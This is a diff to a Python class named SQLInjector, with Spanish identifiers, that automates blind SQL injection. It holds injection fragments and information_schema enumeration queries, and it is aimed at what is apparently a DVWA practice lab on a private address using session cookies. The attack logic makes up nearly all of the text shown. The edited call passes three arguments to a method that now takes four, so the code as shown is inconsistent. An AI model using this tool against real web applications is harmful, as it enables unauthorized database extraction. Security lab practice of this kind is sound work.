@@ -26,8 +26,10 @@ class SQLInjector:
     __cola: str = "'-- -"
     __parametroDivisor: str = ";PARAM;"
     __parametroDivisor2: str = ";PARAM_A_ADD;"
-    __busqurdaDataBase: str = "select schema_name from information_schema.schemata"
-    __busquedaTables: str = "select table_name from information_schema.tables"
+    __busqurdaDataBase: str = "select schema_name from "
+    __busquedaTables: str = "select table_name from "
+    __databasebase: str = "information_schema"
+    __tablabase: str = "schemata"
     # __tochoComparador0: str = "' or substring(("
     __tochoComparador0: str = " or substring(("
     __tochoComparador1: str = " limit "
@@ -86,7 +88,7 @@ class SQLInjector:
     def getIniciado(self):
         return self.__iniciado
 
-    def buscarBlind(self, tipo: DataBaseOptions, comilla: bool, extra: str):
+    def buscarBlind(self, tipo: DataBaseOptions, comilla: bool, database: str, tabla: str):
         resultado: list = []
         if self.__iniciado is True:
             retorno: str = ""
@@ -99,9 +101,9 @@ class SQLInjector:
         return resultado
 
 
-dic = {"PHPSESSID": "vesf85lptvdtv2hhmfsi6sluc3", "security": "low"}
-s = SQLInjector("http://192.168.0.100/vulnerabilities/sqli_blind/?id=;PARAM;&Submit=Submit#", dic)
-print(s.buscarBlind(DataBaseOptions.tables, True))
+dic = {"PHPSESSID": "n0v4k2rn5rvoeijuq2c78kjft4", "security": "low"}
+s = SQLInjector("http://192.168.0.103/vulnerabilities/sqli_blind/?id=;PARAM;&Submit=Submit#", dic)
+print(s.buscarBlind(DataBaseOptions.tables, True, ""))
 # print(s.generarStringDataBase(0, "mysql"))
 """
 for value in urldividida:
